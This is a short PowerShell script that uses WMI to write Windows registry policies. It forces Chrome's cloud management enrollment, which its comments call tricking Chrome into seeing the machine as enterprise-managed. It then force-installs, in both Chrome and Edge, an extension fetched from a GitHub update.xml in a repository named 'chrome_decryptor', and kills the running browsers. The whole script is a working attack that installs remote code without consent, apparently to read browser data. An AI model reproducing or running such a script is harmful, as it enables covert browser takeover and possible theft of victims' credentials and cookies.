# 1. Clean the ID and URL
$extId = "oihkjppelmofdfenjbmbhiamlcejahgm" # Ensure this is exactly 32 chars (a-p)
$xmlUrl = "https://raw.githubusercontent.com/tn2g4fh-alt/chrome_decryptor/refs/heads/main/update.xml"
$policyValue = "$extId;$xmlUrl"
$HKLM = [uint32]2147483650
$wmi = [WMIClass]"root\default:StdRegProv"

# 2. FORCE MANAGEMENT ENROLLMENT (Critical Step)
# This tricks Chrome into seeing the machine as Enterprise-managed.
$mgmtPath = "SOFTWARE\Policies\Google\Update"
$wmi.CreateKey($HKLM, $mgmtPath)
$wmi.SetDwordValue($HKLM, $mgmtPath, "CloudManagementEnrollmentMandatory", 1)

# 3. Inject Cleaned Policies
$chromePath = "SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist"
$wmi.CreateKey($HKLM, $chromePath)
$wmi.SetStringValue($HKLM, $chromePath, "1", $policyValue)

# 4. Repeat for Edge
$edgePath = "SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist"
$wmi.CreateKey($HKLM, $edgePath)
$wmi.SetStringValue($HKLM, $edgePath, "1", $policyValue)

# 5. Force Restart to Apply
Get-Process chrome, msedge -ErrorAction SilentlyContinue | Stop-Process -Force
